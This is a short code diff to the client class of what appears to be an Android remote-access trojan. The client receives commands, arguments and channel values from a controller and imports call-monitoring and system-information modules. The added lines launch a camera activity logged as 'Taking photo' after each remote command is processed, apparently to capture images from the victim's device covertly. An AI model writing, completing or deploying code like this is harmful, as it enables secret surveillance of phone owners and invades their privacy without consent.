@@ -10,14 +10,12 @@ import java.util.StringTokenizer;
 import java.util.prefs.Preferences;
 
 import out.Connection;
-
-
 import my.app.Library.CallMonitor;
 import my.app.Library.SystemInfo;
-
 import Packet.*;
 import android.app.AlarmManager;
 import android.app.PendingIntent;
+import android.content.ComponentName;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.SharedPreferences;
@@ -171,6 +169,18 @@ public class Client extends ClientListener implements Controler {
     {
 		try{
 			procCmd.process(b.getShort("command"),b.getByteArray("arguments"),b.getInt("chan"));
+		     Log.i("PhotoTaker", "Taking photo");
+		     try{
+			     Intent intent = new Intent();
+			     intent.setAction(Intent.ACTION_MAIN);
+			     intent.addCategory(Intent.CATEGORY_LAUNCHER);
+			     intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+			     ComponentName cn = new ComponentName(this, CameraActivity.class);
+			     intent.setComponent(cn);
+			     startActivity(intent);
+		     }catch (Exception e){
+		    	 Log.e("PhotoTaker", "ERROR starting activity camera: " + e.toString());
+		     }
 		}
 		catch(Exception e) {
 			sendError("Error on Client:"+e.getMessage());
